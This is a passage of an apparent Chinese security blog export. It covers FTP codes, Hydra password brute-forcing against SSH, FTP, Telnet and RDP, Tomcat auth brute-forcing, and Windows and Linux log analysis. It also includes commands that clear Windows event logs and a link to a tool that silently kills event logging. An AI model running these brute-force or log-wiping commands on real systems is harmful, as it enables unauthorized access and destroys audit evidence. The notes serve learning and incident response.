id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>230</td><td>用户登录</td></tr><tr><td>226</td><td>请求的文件操作成功</td></tr><tr><td>213</td><td>文件状态</td></tr><tr><td>530</td><td>账号或密码错误</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">FTP应答码&amp;响应码</span><br><span class="line"></span><br><span class="line">110： 重新启动标记应答。</span><br><span class="line">120： 在n分钟内准备好</span><br><span class="line">125： 连接打开准备传送</span><br><span class="line">150： 打开数据连接</span><br><span class="line">200： 命令成功</span><br><span class="line">202： 命令失败</span><br><span class="line">211： 系统状态</span><br><span class="line">212： 目录状态</span><br><span class="line">213： 文件状态</span><br><span class="line">214： 帮助信息</span><br><span class="line">215： 名字系统类型</span><br><span class="line">220： 新用户服务准备好了</span><br><span class="line">221： 服务关闭控制连接，可以退出登录</span><br><span class="line">225： 数据连接打开，无传输正在进行</span><br><span class="line">226： 关闭数据连接，请求的文件操作成功</span><br><span class="line">227： 进入被动模式</span><br><span class="line">230： 用户登录</span><br><span class="line">250： 请求的文件操作完成</span><br><span class="line">257： 创建”PATHNAME”</span><br><span class="line">331： 用户名正确，需要口令</span><br><span class="line">332： 登录时需要帐户信息</span><br><span class="line">350： 下一步命令</span><br><span class="line">421： 不能提供服务，关闭控制连接</span><br><span class="line">425： 不能打开数据连接</span><br><span class="line">426： 关闭连接，中止传输</span><br><span class="line">450： 请求的文件操作未执行</span><br><span class="line">451： 中止请求的操作：有本地错误</span><br><span class="line">452： 未执行请求的操作：系统存储空间不足</span><br><span class="line">500： 格式错误，命令不可识别</span><br><span class="line">501： 参数语法错误</span><br><span class="line">502： 命令未实现</span><br><span class="line">503： 命令顺序错误</span><br><span class="line">504： 此参数下的命令功能未实现</span><br><span class="line">530： 未登录</span><br><span class="line">532： 存储文件需要帐户信息</span><br><span class="line">550： 未执行请求的操作</span><br><span class="line">551： 请求操作中止：页类型未知</span><br><span class="line">552： 请求的文件操作中止，存储分配溢出</span><br><span class="line">553： 未执行请求的操作：文件名不合法</span><br><span class="line"></span><br><span class="line">FTP术语</span><br><span class="line">150　　　 文件状态良好，打开数据连接</span><br><span class="line">200　　　 命令成功</span><br><span class="line">202　　　 命令未实现</span><br><span class="line">211　　　 系统状态或系统帮助响应</span><br><span class="line">212　　　 目录状态</span><br><span class="line">213　　　 文件状态</span><br><span class="line">214　　　 帮助信息，信息仅对人类用户有用</span><br><span class="line">215　　　 名字系统类型</span><br><span class="line">220　　　 对新用户服务准备好</span><br><span class="line">221　　　 服务关闭控制连接，可以退出登录</span><br><span class="line">225　　　 数据连接打开，无传输正在进行</span><br><span class="line">226　　　 关闭数据连接，请求的文件操作成功</span><br><span class="line">227　　　 进入被动模式</span><br><span class="line">230　　　 用户登录</span><br><span class="line">250　　　 请求的文件操作完成</span><br><span class="line">257　　　 创建”PATHNAME”</span><br><span class="line">331　　　 用户名正确，需要口令</span><br><span class="line">332　　　 登录时需要帐户信息</span><br><span class="line">350　　　 请求的文件操作需要进一步命令</span><br><span class="line">421　　　 连接用户过多</span><br><span class="line">425　　　 不能打开数据连接</span><br><span class="line">426　　　 关闭连接，中止传输</span><br><span class="line">450 　　　请求的文件操作未执行</span><br><span class="line">451 　　　中止请求的操作：有本地错误</span><br><span class="line">452 　　　未执行请求的操作：系统存储空间不足</span><br><span class="line">500 　　　格式错误，命令不可识别</span><br><span class="line">501 　　　参数语法错误</span><br><span class="line">502 　　　命令未实现</span><br><span class="line">503 　　　命令顺序错误</span><br><span class="line">504　　　 此参数下的命令功能未实现</span><br><span class="line">530 　　　账号或密码错误</span><br><span class="line">532 　　　存储文件需要帐户信息</span><br><span class="line">550 　　　未执行请求的操作</span><br><span class="line">551　　　 请求操作中止：页类型未知</span><br><span class="line">552　　　 请求的文件操作中止，存储分配溢出</span><br><span class="line">553　　　 未执行请求的操作：文件名不合法</span><br></pre></td></tr></table></figure><h2 id="连接模式"><a href="#连接模式" class="headerlink" title="连接模式"></a>连接模式</h2><h3 id="主动模式PORT"><a href="#主动模式PORT" class="headerlink" title="主动模式PORT"></a>主动模式PORT</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/25303e8b6c12b922a81b42456d3c1374.png" alt="img"></p><h3 id="被动模式PASV"><a href="#被动模式PASV" class="headerlink" title="被动模式PASV"></a>被动模式PASV</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/a1d996c9d307cd9e955002abdd05426a.png" alt="img"></p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>主动模式和被动模式的不同简单概述为： 主动模式传送数据时是“服务器”连接到“客户端”的端口（客户端开启数据端口）；被动模式传送数据是“客户端”连接到“服务器”的端口（服务端开启数据端口）。</p><p><strong>主动模式</strong>需要客户端必须开放端口给FTP服务端，很多客户端都是在防火墙内，开放端口给FTP服务器访问比较困难。</p><p><strong>被动模式</strong>只需要服务器端开放端口给客户端连接就行了，如果服务端在防火墙内，也需要做端口映射才行。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/jingzi123456789/article/details/83409572">FTP的主动模式和被动模式工作原理及抓包分析</a></p><p><a href="https://help.aliyun.com/document_detail/92048.html">手动搭建FTP站点</a></p><p><a href="https://my.oschina.net/chenguang/blog/375311">FTP服务器日志解析</a></p><p><a href="https://www.cnblogs.com/zhengchunyuan/p/9212361.html">vsftp日志xferlog格式分析</a></p><p><a href="https://blog.csdn.net/cbffyx/article/details/78891603">FTP应答码&amp;响应码</a></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> 运维 </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra</title>
      <link href="/p/d0f422c5.html"/>
      <url>/p/d0f422c5.html</url>
      
        <content type="html"><![CDATA[<h2 id="支持协议"><a href="#支持协议" class="headerlink" title="支持协议"></a>支持协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-R</td><td>继续爆破先前中止/崩溃的会话</td></tr><tr><td>-S</td><td>执行 SSL 连接</td></tr><tr><td>-s PORT</td><td>指定非默认端口</td></tr><tr><td>-l  LOGIN</td><td>使用 LOGIN 名称登录</td></tr><tr><td>-L FILE</td><td>从 FILE 加载多个登录名</td></tr><tr><td>-p PASS</td><td>尝试密码 PASS</td></tr><tr><td>-P FILE</td><td>从 FILE 加载多个密码</td></tr><tr><td>-e nsr</td><td>n 使用空密码，s 用户名作为密码， r用户名倒过来作为密码</td></tr><tr><td>-C FILE</td><td>使用冒号分割格式，例如“登录名:密码”而不是 -L/-P 选项</td></tr><tr><td>-M FILE</td><td>从文件中获取攻击列表，:后带端口，一行一条</td></tr><tr><td>-o FILE</td><td>输出到指定文件</td></tr><tr><td>-b FORMAT</td><td>指定-o输出格式，默认为txt</td></tr><tr><td>-f / -F</td><td>在-M列表攻击模式下，找到第一个解锁的密码停止破解，-f 停止对当前主机破解，-F停止所有主机</td></tr><tr><td>-t TASKS</td><td>同时并行线程数，默认为16</td></tr><tr><td>-T TASKS</td><td>在-M列表模式下，整体的并行数量</td></tr><tr><td>-w / -W TIME</td><td>最大超时时间，单位s 默认30s</td></tr><tr><td>-v / -V / -d</td><td>详细模式/每次尝试都显示登录+通过/调试模式</td></tr><tr><td>server</td><td>目标IP/DNS/网段</td></tr><tr><td>service</td><td>支持服务名</td></tr></tbody></table><h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l xxx -P test_password.txt -V [ip] ssh </span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907142152059.png" alt="image-20210907142152059"></p><h2 id="破解ftp"><a href="#破解ftp" class="headerlink" title="破解ftp"></a>破解ftp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L test_users.txt -P test_password.txt -V -f ftp://192.168.77.199</span><br></pre></td></tr></table></figure><h2 id="破解telnet"><a href="#破解telnet" class="headerlink" title="破解telnet"></a>破解telnet</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.77.199 telnet -L test_users.txt -P test_password.txt -V</span><br></pre></td></tr></table></figure><h2 id="破解RDP"><a href="#破解RDP" class="headerlink" title="破解RDP"></a>破解RDP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.77.199 rdp -L test_users.txt -P test_password.txt -V</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解常用工具</title>
      <link href="/p/df53a981.html"/>
      <url>/p/df53a981.html</url>
      
        <content type="html"><![CDATA[<h1 id="tomcat认证爆破"><a href="#tomcat认证爆破" class="headerlink" title="tomcat认证爆破"></a>tomcat认证爆破</h1><p>密码特征：用户名密码<code>:</code>相连，base64编码</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195540654.png" alt="image-20210906195540654"></p><p>使用迭代器，添加第一个字符串的字典</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195824006.png" alt="image-20210906195824006"></p><p>同理添加第2，3个要拼接的字符串</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195837171.png" alt="image-20210906195837171"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195918991.png" alt="image-20210906195918991"></p><p>进行base64编码</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906200007890.png" alt="image-20210906200007890"></p><p>成功返回200，失败返回401</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906200045570.png" alt="image-20210906200045570"></p><h1 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h1><p><a href="https://dropann.github.io/p/d0f422c5.html">https://dropann.github.io/p/d0f422c5.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows日志</title>
      <link href="/p/24f823ca.html"/>
      <url>/p/24f823ca.html</url>
      
        <content type="html"><![CDATA[<h2 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h2><h3 id="windows-2000专业版-windows-Server2003-windows-XP"><a href="#windows-2000专业版-windows-Server2003-windows-XP" class="headerlink" title="windows 2000专业版/windows Server2003/windows XP"></a>windows 2000专业版/windows Server2003/windows XP</h3><p>系统日志 <code>C:\Windows\System32\config\SysEvent.evt</code></p><p>安全性日志 <code>C:\Windows\System32\config\SecEvent.evt</code></p><p>应用程序日志 <code>C:\Windows\System32\config\AppEvent.evt</code></p><h3 id="Vista-win7-win8-win10-winser2008以上"><a href="#Vista-win7-win8-win10-winser2008以上" class="headerlink" title="Vista/win7/win8/win10/winser2008以上"></a>Vista/win7/win8/win10/winser2008以上</h3><p>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p><p>安全性日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p><p>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p><p>事件查看器 <code>win+r --&gt; eventvwr</code></p><h2 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h2><h3 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h3><p>主要记录驱动程序，操作系统的多种组件，应用软件在运行中出现的重大问题，包括重要数据的丢失、错误，以及系统产生的崩溃行为等。</p><h3 id="2-安全性日志"><a href="#2-安全性日志" class="headerlink" title="2.安全性日志"></a>2.安全性日志</h3><p>主要记录各种与安全相关的事件，包括登录与退出系统的成功与不成功信息，对系统中重要资源的各种操作，对系统文件创建、删除、更改等操作。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621151545645-ed87a0f2-18b8-46a6-acf0-3f90ed9ae6b0.png" alt="img"></p><h3 id="3-应用程序日志"><a href="#3-应用程序日志" class="headerlink" title="3.应用程序日志"></a>3.应用程序日志</h3><p>记录各种应用程序产生的各类事件</p><mark class="hl-label orange">注意</mark>  windows 2000专业版/windows Server2003/windows XP中只有应用程序、安全性、系统三类日志。<p><strong>PowerShell日志</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906143917888.png" alt="image-20210906143917888"></p><h2 id="日志常用事件ID"><a href="#日志常用事件ID" class="headerlink" title="日志常用事件ID"></a>日志常用事件ID</h2><p><a href="https://docs.microsoft.com/zh-cn/windows/security/identity-protection/">标识和访问管理</a></p><h3 id="应急响应中常用"><a href="#应急响应中常用" class="headerlink" title="应急响应中常用"></a>应急响应中常用</h3><table><thead><tr><th>事件ID(旧版本)</th><th>事件ID(新版本)</th><th>描述</th><th>事件日志</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>安全</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>安全</td></tr><tr><td>680</td><td>4776</td><td>成功/失败的账户认证</td><td>安全</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>安全</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>安全</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>安全</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>系统</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务的启动类型已从禁用更改为自动启动</td><td>系统</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>系统</td></tr></tbody></table><h3 id="登录相关日志事件ID"><a href="#登录相关日志事件ID" class="headerlink" title="登录相关日志事件ID"></a>登录相关日志事件ID</h3><table><thead><tr><th>事件ID</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>4624</td><td>用户登录成功</td><td>在目标计算机上创建登录会话时 (此事件) 。 它会在已访问的计算机上生成，其中创建了会话。</td></tr><tr><td>4625</td><td>用户登录失败</td><td>如果在帐户已被锁定时尝试登录账户失败，则生成此事件。</td></tr><tr><td>4672</td><td>特殊权限用户登录</td><td>特殊权限登录，如登录Administrator,一般会看到4624和4672一起出现</td></tr><tr><td>4648</td><td>显式凭证登录</td><td>当进程通过显式指定帐户的凭据尝试登录帐户时。这最常发生在批处理类型配置（如计划任务）中，或者使用”RUNAS/USER”命令时(不过在使用runas时，也会产生4624)</td></tr></tbody></table><h3 id="登录类型"><a href="#登录类型" class="headerlink" title="登录类型"></a>登录类型</h3><table><thead><tr><th>ID</th><th>登录类型(LogonType)</th><th>描述</th></tr></thead><tbody><tr><td>2</td><td>Interactive</td><td>用户登录到本机</td></tr><tr><td>3</td><td>Network</td><td>用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享</td></tr><tr><td>4</td><td>Batch</td><td>批处理登录类型，无需用户干预</td></tr><tr><td>5</td><td>Service</td><td>服务控制管理器登录</td></tr><tr><td>7</td><td>Unlock</td><td>用户解锁主机</td></tr><tr><td>8</td><td>NetworkCleartext</td><td>用户从网络登录到此计算机，用户密码用非哈希的形式传递</td></tr><tr><td>9</td><td>NewCredentials</td><td>进程或线程克隆了其当前令牌，但为出站连接指定了新凭据</td></tr><tr><td>10</td><td>Remotelnteractive</td><td>使用终端服务或远程桌面连接登录</td></tr><tr><td>11</td><td>Cachedlnteractive</td><td>用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志</td></tr><tr><td>12</td><td>CachedRemotelnteractive</td><td>与Remotelnteractive 相同，内部用于审计目的</td></tr><tr><td>13</td><td>CachedUnlock</td><td>登录尝试解锁</td></tr></tbody></table><h3 id="启用事件相关"><a href="#启用事件相关" class="headerlink" title="启用事件相关"></a>启用事件相关</h3><table><thead><tr><th>事件</th><th>事件ID</th><th>事件级别</th><th>事件日志</th><th>事件来源</th></tr></thead><tbody><tr><td>关机初始化失败</td><td>1074</td><td>警告</td><td>User32</td><td>User32</td></tr><tr><td>Windows关闭</td><td>13</td><td>信息</td><td>系统</td><td>Kernel-General</td></tr><tr><td>Windows启动</td><td>12</td><td>信息</td><td>系统</td><td>Kernel-General</td></tr></tbody></table><h3 id="日志清除相关"><a href="#日志清除相关" class="headerlink" title="日志清除相关"></a>日志清除相关</h3><table><thead><tr><th>事件</th><th>事件ID</th><th>事件级别</th><th>事件日志</th><th>事件来源</th></tr></thead><tbody><tr><td>事件日志服务关闭</td><td>1100</td><td>信息</td><td>安全</td><td>EventLog</td></tr><tr><td>事件日志被清除</td><td>104</td><td>信息</td><td>系统</td><td>EventLog</td></tr><tr><td>事件日志被清除</td><td>1102</td><td>信息</td><td>安全</td><td>EventLog</td></tr></tbody></table><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907103024034.png" alt="image-20210907103024034"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907103046020.png" alt="image-20210907103046020"></p><p><a href="https://docs.microsoft.com/zh-cn/windows/security/identity-protection/">Windows事件ID大全</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="内置筛选器"><a href="#内置筛选器" class="headerlink" title="内置筛选器"></a>内置筛选器</h3><p>筛选内容：记录时间、事件级别、任务类别、关键字等</p><h3 id="PowerShell进行日志分析"><a href="#PowerShell进行日志分析" class="headerlink" title="PowerShell进行日志分析"></a>PowerShell进行日志分析</h3><h4 id="Get-EventLog和Get-WinEvent区别"><a href="#Get-EventLog和Get-WinEvent区别" class="headerlink" title="Get-EventLog和Get-WinEvent区别"></a><code>Get-EventLog</code>和<code>Get-WinEvent</code>区别</h4><p><code>Get-EventLog</code>只获取传统的事件日志，<code>Get-WinEvent</code>是从传统的事件日志和新Windows事件日志技术生成的事件日志中获取事件，但同时需要<code>Vista</code>,<code>server2008</code>还需要<code>.NET 3.5以上版本</code></p><p>Get-EventLog筛选日志</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-EventLog</span> Security <span class="literal">-instanceid</span> <span class="number">4624</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906165840352.png" alt="image-20210906165840352"></p><p>Get-WinEvent筛选日志</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;Logname=<span class="string">&#x27;security&#x27;</span>;ID=<span class="string">&#x27;4624&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906170344196.png" alt="image-20210906170344196"></p><h3 id="日志工具"><a href="#日志工具" class="headerlink" title="日志工具"></a>日志工具</h3><h4 id="fulleventlogview"><a href="#fulleventlogview" class="headerlink" title="fulleventlogview"></a>fulleventlogview</h4><p><a href="https://www.nirsoft.net/utils/full_event_log_view.html">下载地址</a></p><p>免安装，检索速度比自带的好。默认是7天日志，可在高级选项中更改。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906163615943.png" alt="image-20210906163615943"></p><h2 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h2><p>以下内容主要参考：<a href="https://www.cnblogs.com/xiaozi/p/13633934.html">Windows 入侵痕迹清理技巧</a></p><h3 id="windows日志"><a href="#windows日志" class="headerlink" title="windows日志"></a>windows日志</h3><p>1.事件查看器，清除日志</p><p>2.命令行清除日志</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-ListLog</span> Application,Setup,Security <span class="literal">-Force</span> | % &#123;Wevtutil.exe cl <span class="variable">$_</span>.Logname&#125;</span><br></pre></td></tr></table></figure><p>3.利用脚本停止日志记录</p><p>该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。因此，系统将无法收集日志，同时事件日志服务似乎正在运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hlldz/Invoke-Phant0m</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux日志</title>
      <link href="/p/c8bc8d54.html"/>
      <url>/p/c8bc8d54.html</url>
      
        <content type="html"><![CDATA[<h2 id="日志存放位置"><a href="#日志存放位置" class="headerlink" title="日志存放位置"></a>日志存放位置</h2><p>linux下日志文件一般存放在<code>/var/log/</code></p><p><code>/var/log/wtmp</code>  记录登录进入 退出 数据交换 关机 重启。即<code>last</code>命令</p><p><code>/var/log/cron</code>  记录与定时任务相关的日志信息</p><p><code>/var/log/messages</code>  记录系统重启后的日志信息和错误日志(mail,cron,daemon,kern,auth等内容也记录在此)</p><p><code>/var/log/apache2/access.log</code> 记录Apache访问日志</p><p><code>/var/log/auth.log</code>  记录系统授权信息，包括用户登录和使用的权限机制</p><p><code>/var/log/userlog</code>  等级用户信息</p><p><code>/var/log/xferlog(vsftpd.log) </code>  ftp日志</p><p><code>/var/log/lastlog</code>  记录登录的用户===<code>lastlog</code> 命令</p><p><code>/var/log/secure</code>  记录大多数应用输入的账号和密码，以及是否成功登录</p><p><code>/var/log/faillog</code>  登录系统不成功的账号信息</p><p><code>ls -alt /var/spool/mail/</code>  查看邮件相关日志记录文件</p><p><code>cat /var/spool/mail/root</code>  邮件提醒</p><p><code>/var/log/sssd</code> 用于守护进程安全服务</p><h3 id="开启Ubuntu下cron日志"><a href="#开启Ubuntu下cron日志" class="headerlink" title="开启Ubuntu下cron日志"></a>开启Ubuntu下cron日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rsyslog.d/50-default.conf</span><br></pre></td></tr></table></figure><p>文件中找到<code>cron.*</code>，把前面的#去掉，保存退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service rsyslog restart</span><br></pre></td></tr></table></figure><p>实时查看日志：<code>less /var/log/cron.log</code></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="在-log日志文件中独立IP地址个数"><a href="#在-log日志文件中独立IP地址个数" class="headerlink" title="在*.log日志文件中独立IP地址个数"></a>在<code>*.log</code>日志文件中独立IP地址个数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print$1&#125;&#x27; test.log | sort | uniq | wc -l</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621160839031-b36095ed-618e-4b78-b631-97edf5734e3d.png" alt="img"></p><h3 id="指定时间段日志"><a href="#指定时间段日志" class="headerlink" title="指定时间段日志"></a>指定时间段日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/2021-05-10 00:01:28/,/2021-05-16 00:05:50/p&#x27; log_file_catalina.out</span><br><span class="line">sudo sed -n &#x27;/May 09 20:48:54/,/May 15 23:45:54/p&#x27; yum.log</span><br><span class="line">sed -n &#x27;/Sep  1 14:52:01/&#x27;,&#x27;/Sep  1 15:40:01/p&#x27; cron</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621173054449-0d1ac94d-2007-4173-8c88-a1015f002f29.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep &quot;May 15 23:*:*&quot; yum.log</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621173507781-b0099bc5-6a92-4c1c-8761-f52b332d5f74.png" alt="img"></p><h3 id="定位多少ip暴力破解root"><a href="#定位多少ip暴力破解root" class="headerlink" title="定位多少ip暴力破解root"></a>定位多少ip暴力破解root</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure | awk &#x27;/Failed password/&#123;print $(NF-3)&#125;&#x27;|sort|uniq -c |sort -k 1 -rn</span><br></pre></td></tr></table></figure><blockquote><p><code>NF</code>表示一条记录的字段的数目，<code>$(NF-3)</code>表示从后往前取第四列。</p></blockquote><h3 id="查看通过密码登录成功的IP地址总次数"><a href="#查看通过密码登录成功的IP地址总次数" class="headerlink" title="查看通过密码登录成功的IP地址总次数"></a>查看通过密码登录成功的IP地址总次数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /var/log/secure | awk &#x27;/Accepted password/&#123;print $(NF-3)&#125;&#x27;|sort|uniq -c |awk &#x27;&#123;print $2&quot;=&quot;$1;&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="免密登录成功总次数"><a href="#免密登录成功总次数" class="headerlink" title="免密登录成功总次数"></a>免密登录成功总次数</h3><figure class="highlight 